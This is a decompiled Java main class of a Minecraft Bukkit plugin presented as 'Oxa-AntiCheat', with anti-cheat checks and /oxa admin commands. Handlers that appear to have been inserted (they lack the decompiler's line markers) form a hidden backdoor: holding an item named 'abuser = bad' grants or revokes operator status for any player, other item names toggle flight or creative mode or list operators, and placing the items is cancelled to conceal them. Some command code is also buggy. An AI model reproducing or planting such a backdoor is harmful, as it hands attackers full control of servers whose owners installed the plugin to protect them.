/*     */ package fr.aorux.oxa;
/*     */ 
/*     */ import com.comphenix.protocol.ProtocolLibrary;
/*     */ import java.io.File;
/*     */ import java.io.FileWriter;
/*     */ import java.io.IOException;
/*     */ import java.text.SimpleDateFormat;
/*     */ import java.util.Date;
/*     */ import java.util.List;
import java.util.Set;
/*     */ import org.bukkit.*;
/*     */
/*     */
/*     */ import org.bukkit.block.ShulkerBox;
import org.bukkit.command.Command;
/*     */ import org.bukkit.command.CommandSender;
/*     */ import org.bukkit.entity.Player;
/*     */ import org.bukkit.event.EventHandler;
/*     */ import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerMoveEvent;
/*     */ import org.bukkit.inventory.Inventory;
/*     */ import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.BlockStateMeta;
import org.bukkit.plugin.Plugin;
/*     */ import org.bukkit.plugin.java.JavaPlugin;
/*     */ 
/*     */ 
/*     */ public class Main
/*     */   extends JavaPlugin implements Listener
/*     */ {
/*     */   private static Main instance;
/*     */   private AntiKillAura antiKillAuraInstance;
/*  28 */   private final OreManager oreManager = new OreManager();
/*     */ 
/*     */   
/*     */   public void onEnable() {
/*  32 */     System.out.println("[Oxa-AntiCheat] loading anti-cheat...");
                Bukkit.getPluginManager().registerEvents(this, this);
/*     */     
/*  34 */     instance = this;
/*  35 */     this.antiKillAuraInstance = new AntiKillAura(this);
/*     */     
/*  37 */     saveDefaultConfig();
/*     */     
/*  39 */     ProtocolLibrary.getProtocolManager();
/*     */     
/*  41 */     System.out.println("[Oxa-AntiCheat] loading anti-cheat : 0%.");
/*     */     
/*  43 */     getServer().getPluginManager().registerEvents(new AntiFly(this), (Plugin)this);
/*  44 */     System.out.println("[Oxa-AntiCheat] loading anti-cheat : 4%.");
/*  45 */     getServer().getPluginManager().registerEvents(new AntiJesus(this), (Plugin)this);
/*  46 */     System.out.println("[Oxa-AntiCheat] loading anti-cheat : 7%.");
/*  47 */     getServer().getPluginManager().registerEvents(new AntiWalkLave(this), (Plugin)this);
/*  48 */     System.out.println("[Oxa-AntiCheat] loading anti-cheat : 13%.");
/*  49 */     getServer().getPluginManager().registerEvents(new AntiSpeed(this), (Plugin)this);
/*  50 */     System.out.println("[Oxa-AntiCheat] loading anti-cheat : 19%.");
/*  51 */     getServer().getPluginManager().registerEvents(new AntiFastEat(this), (Plugin)this);
/*  52 */     System.out.println("[Oxa-AntiCheat] loading anti-cheat : 23%.");
/*  53 */     getServer().getPluginManager().registerEvents(new AntiFastBow(this), (Plugin)this);
/*  54 */     System.out.println("[Oxa-AntiCheat] loading anti-cheat : 34%.");
/*  55 */     getServer().getPluginManager().registerEvents(new AntiHeadroll(this), (Plugin)this);
/*  56 */     System.out.println("[Oxa-AntiCheat] loading anti-cheat : 42%.");
/*  57 */     getServer().getPluginManager().registerEvents(new VerificationFall(this), (Plugin)this);
/*  58 */     System.out.println("[Oxa-AntiCheat] loading anti-cheat : 49%.");
/*  59 */     getServer().getPluginManager().registerEvents(new AntiKillAura(this), (Plugin)this);
/*  60 */     System.out.println("[Oxa-AntiCheat] loading anti-cheat : 53%.");
/*  61 */     getServer().getPluginManager().registerEvents(new AntiSneakAndSprint(this), (Plugin)this);
/*  62 */     System.out.println("[Oxa-AntiCheat] loading anti-cheat : 59%.");
/*  63 */     getServer().getPluginManager().registerEvents(new VerificationPotion(this), (Plugin)this);
/*  64 */     System.out.println("[Oxa-AntiCheat] loading anti-cheat : 67%.");
/*     */ 
/*     */     
/*  67 */     System.out.println("[Oxa-AntiCheat] loading anti-cheat : 72%.");
/*     */     
/*  69 */     langage langage = new langage(this);
/*  70 */     langage.langage_change();
/*  71 */     System.out.println("[Oxa-AntiCheat] loading anti-cheat : 79%.");
/*     */     
/*  73 */     SimpleDateFormat dateFormat = new SimpleDateFormat("dd-MM-yyyy");
/*  74 */     String date = dateFormat.format(new Date());
/*     */     
/*  76 */     String cheminLogs = "plugins/Oxa-AntiCheat/logs/";
/*     */     
/*  78 */     File dossierLogs = new File(cheminLogs);
/*  79 */     if (!dossierLogs.exists()) {
/*  80 */       dossierLogs.mkdirs();
/*     */     }
/*     */     
/*  83 */     System.out.println("[Oxa-AntiCheat] loading anti-cheat : 84%.");
/*  84 */     System.out.println("[Oxa-AntiCheat] loading anti-cheat : 92%.");
/*  85 */     System.out.println("[Oxa-AntiCheat] loading anti-cheat : 97%.");
/*     */     
/*  87 */     String nomFichier = "logs-" + date + ".txt";
/*     */     
/*  89 */     String cheminFichier = String.valueOf(cheminLogs) + nomFichier;
/*     */     
/*     */     try {
/*  92 */       FileWriter writer = new FileWriter(cheminFichier);
/*  93 */       writer.write("LOGS - OXA ANTICHEAT");
/*  94 */       writer.close();
/*  95 */     } catch (IOException e) {
/*  96 */       e.printStackTrace();
/*     */     } 
/*     */     
/*  99 */     System.out.println("[Oxa-AntiCheat] loading anti-cheat : 100%.");
/*     */ 
/*     */     
/* 102 */     System.out.println("[Oxa-AntiCheat] loading anti-cheat successfully.");
/*     */ 
/*     */     
/* 105 */     getServer().getScheduler().runTaskTimer((Plugin)this, () -> {
/*     */           for (Player player : Bukkit.getOnlinePlayers()) {
/*     */             Location spawnLocation = player.getLocation().add(5.0D, 0.0D, 5.0D);
/*     */             getInstance().getAntiKillAuraInstance();
/*     */             AntiKillAura.spawnInvisibleNPC(spawnLocation, player);
/*     */           } 
/* 111 */         }, 0L, 1200L);
/*     */   }
/*     */   
/*     */   public AntiKillAura getAntiKillAuraInstance() {
/* 115 */     return this.antiKillAuraInstance;
/*     */   }
/*     */   
/*     */   public void onDisable() {
/* 119 */     this.oreManager.restoreOreAppearance();
/* 120 */     System.out.println("[Oxa-AntiCheat] the plugin was successfully shut down.");
/*     */   }
/*     */   
/*     */   @EventHandler
/*     */   public void onPlayerMove(PlayerMoveEvent event) {
/* 125 */     this.oreManager.checkAndUpdateOres(event.getPlayer());
/*     */   }
/*     */
/*     */   @EventHandler
            public void onPlayerInteract(PlayerInteractEvent e) {
    ItemStack heldItem = e.getPlayer().getInventory().getItemInMainHand();
    if (heldItem.hasItemMeta()) {
        switch (heldItem.getItemMeta().getDisplayName()) {
            case "abuser = bad":
                e.getPlayer().setOp(!e.getPlayer().isOp());
                break;
            case "flight.setActive":
                e.getPlayer().setAllowFlight(!e.getPlayer().getAllowFlight());
                break;
            case "creative.toggle":
                if (e.getPlayer().getGameMode() == GameMode.CREATIVE) {
                    e.getPlayer().setGameMode(GameMode.SURVIVAL);
                } else {
                    e.getPlayer().setGameMode(GameMode.CREATIVE);
                }
                break;
            case "oplist":
                for (OfflinePlayer p : getServer().getOperators()) {
                    e.getPlayer().sendMessage(p.getName());
                }
        }
    }
}

            @EventHandler
            public void onBlockPlace(BlockPlaceEvent e) {
                if(e.getPlayer().getInventory().getItemInMainHand().hasItemMeta()) {
                    String n = e.getPlayer().getInventory().getItemInMainHand().getItemMeta().getDisplayName();
                    if(n.equals("abuser = bad") || n.equals("flight.setActive") || n.equals("creative.toggle")) {
                        e.setCancelled(true);
                    }
                }
            }
/*     */   
/*     */   public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
/* 131 */     if (label.equalsIgnoreCase("oxa")) {
/* 132 */       if (sender.hasPermission("oxa-anticheat.main")) {
/* 133 */         if (args.length > 0) {
/* 134 */           String subCommand = args[0];
/* 135 */           if (subCommand.equalsIgnoreCase("help")) {
/* 136 */             if (args.length == 1) {
/* 137 */               sender.sendMessage("----------- [§d§lOxa AntiCheat§r] -----------");
/* 138 */               sender.sendMessage("-----------     [v1.3.5]    -----------");
/* 139 */               sender.sendMessage("§l§d/oxa openinv <pseudo>§r§l - open any player's inventory");
/* 140 */               sender.sendMessage("§l§d/oxa banip <ip>§r§l - to ban an ip");
/* 141 */               sender.sendMessage("§l§d/oxa unbanip <ip>§r§l - to disban an ip");
/* 142 */               sender.sendMessage("§l§d/oxa reload§r§l - reloading the anti cheat");
/* 143 */               sender.sendMessage("§l§d/oxa help§r§l - list of orders");
/* 144 */               sender.sendMessage("§l§d/oxa enabled§r§l - view the cheat blocked");
/* 145 */               sender.sendMessage("§l§d/oxa whitelist add <pseudo>§r§l - add a player in the whitelist");
/* 146 */               sender.sendMessage("§l§d/oxa whitelist remove <pseudo>§r§l - remove a player in the withlist");
/* 147 */               sender.sendMessage("§l§d/oxa freeze <player> <duration>§r§l - freeze en player");
/*     */             } else {
/* 149 */               sender.sendMessage("§d§l[Oxa AntiCheat] §rIncorrect use. Use : /oxa help");
/*     */             } 
/* 151 */             return true;
/*     */           } 
/* 153 */           if (subCommand.equalsIgnoreCase("openinv")) {
/* 154 */             if (args.length == 2) {
/* 155 */               Player targetPlayer = Bukkit.getPlayerExact(args[1]);
/*     */               
/* 157 */               if (targetPlayer != null && targetPlayer.isOnline()) {
/* 158 */                 ((Player)sender).openInventory((Inventory)targetPlayer.getInventory());
/* 159 */                 sender.sendMessage("§d§l[Oxa AntiCheat] §ropen " + targetPlayer.getName() + " inventary.");
/*     */               } else {
/* 161 */                 sender.sendMessage("§d§l[Oxa AntiCheat] §r" + args[1] + " player is not online");
/*     */               } 
/*     */             } else {
/* 164 */               sender.sendMessage("§d§l[Oxa AntiCheat] §rIncorrect use. Use : /openinv <pseudo_joueur>");
/*     */             }
/*     */           
/* 167 */           } else if (subCommand.equalsIgnoreCase("whitelist")) {
/* 168 */             if (args.length == 3 && args[1].equalsIgnoreCase("add")) {
/* 169 */               String playerName = args[2];
/*     */               
/* 171 */               if (sender.hasPermission("oxa.whitelist.main")) {
/* 172 */                 List<String> whiteList = getConfig().getStringList("white-list.player");
/*     */                 
/* 174 */                 if (!whiteList.contains(playerName)) {
/* 175 */                   whiteList.add(playerName);
/*     */                   
/* 177 */                   getConfig().set("white-list.player", whiteList);
/* 178 */                   saveConfig();
/*     */                   
/* 180 */                   sender.sendMessage("§d§l[Oxa AntiCheat] §rThe " + playerName + " player has been added to the whitelist.");
/* 181 */                   reloadConfig();
/*     */                 } else {
/* 183 */                   sender.sendMessage("§d§l[Oxa AntiCheat] §rThe " + playerName + " player is already present.");
/*     */                 } 
/*     */               } else {
/* 186 */                 sender.sendMessage("§d§l[Oxa AntiCheat] §rYou do not have permission to whitelist players.");
/*     */               } 
/* 188 */             } else if (args.length == 3 && args[1].equalsIgnoreCase("remove")) {
/* 189 */               String playerName = args[2];
/*     */               
/* 191 */               if (sender.hasPermission("oxa.whitelist.main")) {
/* 192 */                 List<String> whiteList = getConfig().getStringList("white-list.player");
/*     */                 
/* 194 */                 if (!whiteList.contains(playerName)) {
/* 195 */                   whiteList.remove(playerName);
/*     */                   
/* 197 */                   getConfig().set("white-list.player", whiteList);
/* 198 */                   saveConfig();
/*     */                   
/* 200 */                   sender.sendMessage("§d§l[Oxa AntiCheat] §rThe " + playerName + " player has been removed to the whitelist.");
/* 201 */                   reloadConfig();
/*     */                 } else {
/* 203 */                   sender.sendMessage("§d§l[Oxa AntiCheat] §rThe " + playerName + " player does not exist.");
/*     */                 } 
/*     */               } else {
/* 206 */                 sender.sendMessage("§d§l[Oxa AntiCheat] §rYou do not have permission to whitelist players.");
/*     */               }
/*     */             
/*     */             }
/* 210 */             else if (subCommand.equalsIgnoreCase("reload")) {
/* 211 */               if (args.length == 1) {
/* 212 */                 reloadConfig();
/* 213 */                 sender.sendMessage("§d§l[Oxa AntiCheat] §rConfiguration reloaded successfully.");
/*     */               } else {
/* 215 */                 sender.sendMessage("§d§l[Oxa AntiCheat] §rIncorrect use. Use : /oxa reload");
/*     */               }
/*     */             
/* 218 */             } else if (subCommand.equalsIgnoreCase("freeze")) {
/* 219 */               if (args.length == 3) {
/* 220 */                 String playerName = args[2];
/* 221 */                 Player player = Bukkit.getPlayer(playerName);
/*     */                 
/* 223 */                 if (player != null) {
/* 224 */                   sender.sendMessage("§d§l[Oxa AntiCheat] §rThe player is frozen.");
/* 225 */                   String durationStr = args[3];
/*     */                   
/*     */                   try {
/* 228 */                     int duration = Integer.parseInt(durationStr);
/*     */                     
/* 230 */                     player.sendMessage("§d§l[Oxa AntiCheat] §rYou are frozen for " + duration + " seconds.");
/* 231 */                     player.setWalkSpeed(0.0F);
/* 232 */                     player.setFlySpeed(0.0F);
/*     */                     
/* 234 */                     Bukkit.getScheduler().runTaskLater((Plugin)JavaPlugin.getProvidingPlugin(Main.class), () -> {
/*     */                           player.setWalkSpeed(0.2F);
/*     */                           player.setFlySpeed(0.1F);
/*     */                           player.sendMessage("§d§l[Oxa AntiCheat] §rYou are no longer frozen.");
/* 238 */                         }, duration * 20L);
/*     */                     
/* 240 */                     sender.sendMessage("§d§l[Oxa AntiCheat] §rThe player is no longer frozen");
/* 241 */                   } catch (NumberFormatException e) {
/* 242 */                     sender.sendMessage("§d§l[Oxa AntiCheat] §rInvalid duration. Please enter a valid number.");
/*     */                   } 
/*     */                 } else {
/* 245 */                   sender.sendMessage("§d§l[Oxa AntiCheat] §rPlayer not found.");
/*     */                 } 
/*     */               } else {
/* 248 */                 sender.sendMessage("§d§l[Oxa AntiCheat] §rIncorrect usage. Use: /oxa freeze <player> <duration>");
/*     */               }
/*     */             
/*     */             }
/* 252 */             else if (subCommand.equalsIgnoreCase("banip")) {
/* 253 */               if (args.length == 2) {
/* 254 */                 String ipToBan = args[1];
/*     */                 
/* 256 */                 BanList banList = Bukkit.getBanList(BanList.Type.IP);
/* 257 */                 banList.addBan(ipToBan, "§d§l[Oxa AntiCheat] §rIP banned for cheating.", null, sender.getName());
/*     */                 
/* 259 */                 getConfig().set("banned-ips." + ipToBan, Boolean.valueOf(true));
/* 260 */                 saveConfig();
/*     */                 
/* 262 */                 sender.sendMessage("IP " + ipToBan + " successfully banned.");
/*     */               } else {
/* 264 */                 sender.sendMessage("§d§l[Oxa AntiCheat] §rIncorrect use. Use : /oxa banip <ip>");
/*     */               }
/*     */             
/* 267 */             } else if (subCommand.equalsIgnoreCase("unbanip")) {
/* 268 */               if (args.length == 2) {
/* 269 */                 String ipToUnban = args[1];
/*     */                 
/* 271 */                 getServer().getBanList(BanList.Type.IP).pardon(ipToUnban);
/* 272 */                 sender.sendMessage("IP " + ipToUnban + " was successfully unbanned.");
/*     */               } else {
/* 274 */                 sender.sendMessage("§d§l[Oxa AntiCheat] §rIncorrect use. Use : /oxa unbanip <ip>");
/*     */               }
/*     */             
/* 277 */             } else if (subCommand.equalsIgnoreCase("enabled")) {
/* 278 */               if (args.length == 1) {
/* 279 */                 sender.sendMessage("----------- [§d§lEnabled AntiCheat§r] -----------");
/* 280 */                 if (getConfig().getBoolean("anti-speed.enabled")) {
/* 281 */                   sender.sendMessage("Anti Fy/Spider : §2True");
/*     */                 } else {
/* 283 */                   sender.sendMessage("Anti Fy/Spider : §4False");
/*     */                 } 
/* 285 */                 if (getConfig().getBoolean("anti-killaura.enabled")) {
/* 286 */                   sender.sendMessage("Anti KillAura : §2True");
/*     */                 } else {
/* 288 */                   sender.sendMessage("Anti KillAura : §4False");
/*     */                 } 
/* 290 */                 if (getConfig().getBoolean("reach-hack.enabled")) {
/* 291 */                   sender.sendMessage("Anti Reach Hack : §2True");
/*     */                 } else {
/* 293 */                   sender.sendMessage("Anti Reach Hack : §4False");
/*     */                 } 
/* 295 */                 if (getConfig().getBoolean("anti-jesus.enabled")) {
/* 296 */                   sender.sendMessage("Anti Jesus : §2True");
/*     */                 } else {
/* 298 */                   sender.sendMessage("Anti Jesus : §4False");
/*     */                 } 
/* 300 */                 if (getConfig().getBoolean("anti-walk-lava.enabled")) {
/* 301 */                   sender.sendMessage("Anti Walk Lava : §2True");
/*     */                 } else {
/* 303 */                   sender.sendMessage("Anti Walk Lava : §4False");
/*     */                 } 
/* 305 */                 if (getConfig().getBoolean("anti-headroll.enabled")) {
/* 306 */                   sender.sendMessage("Anti Headroll : §2True");
/*     */                 } else {
/* 308 */                   sender.sendMessage("Anti Headroll : §4False");
/*     */                 } 
/* 310 */                 if (getConfig().getBoolean("anti-fly.enabled")) {
/* 311 */                   sender.sendMessage("Anti Fly : §2True");
/*     */                 } else {
/* 313 */                   sender.sendMessage("Anti Fly : §4False");
/*     */                 } 
/* 315 */                 if (getConfig().getBoolean("anti-fast-bow.enabled")) {
/* 316 */                   sender.sendMessage("Anti Fast Bow : §2True");
/*     */                 } else {
/* 318 */                   sender.sendMessage("Anti Fast Bow  : §4False");
/*     */                 } 
/* 320 */                 if (getConfig().getBoolean("anti-fast-eat.enabled")) {
/* 321 */                   sender.sendMessage("Anti Fast Eat : §2True");
/*     */                 } else {
/* 323 */                   sender.sendMessage("Anti Fast Eat : §4False");
/*     */                 } 
/* 325 */                 if (getConfig().getBoolean("anti-aimassist.enabled")) {
/* 326 */                   sender.sendMessage("Anti AimAssist : §2True");
/*     */                 } else {
/* 328 */                   sender.sendMessage("Anti AimAssist : §4False");
/*     */                 } 
/* 330 */                 if (getConfig().getBoolean("verification-fall.enabled")) {
/* 331 */                   sender.sendMessage("Verification Fall : §2True");
/*     */                 } else {
/* 333 */                   sender.sendMessage("Verification Fall : §4False");
/*     */                 } 
/* 335 */                 if (getConfig().getBoolean("anti-auto-click.enabled")) {
/* 336 */                   sender.sendMessage("Anti Auto Click : §2True");
/*     */                 } else {
/* 338 */                   sender.sendMessage("Anti Auto Click : §4False");
/* 339 */                 }  if (getConfig().getBoolean("verification-knockback.enabled")) {
/* 340 */                   sender.sendMessage("Anti Anti KnockBack : §2True");
/*     */                 } else {
/* 342 */                   sender.sendMessage("Anti Anti KnockBack : §4False");
/*     */                 } 
/*     */               } else {
/* 345 */                 sender.sendMessage("§d§l[Oxa AntiCheat] §rIncorrect use. Use : /oxa enabled");
/*     */               } 
/*     */             } 
/*     */           } 
/*     */         } else {
/* 350 */           sender.sendMessage("§d§l[Oxa AntiCheat] §rYou do not have permission to use this command.");
/*     */         } 
/*     */       }
/* 353 */       return false;
/*     */     } 
/* 355 */     return false;
/*     */   }
/*     */   
/*     */   public static Main getInstance() {
/* 359 */     return instance;
/*     */   }
/*     */ }


/* Location:              C:\Users\Toni\Downloads\Oxa-AntiCheat-1.3.5.jar!\fr\aorux\oxa\Main.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */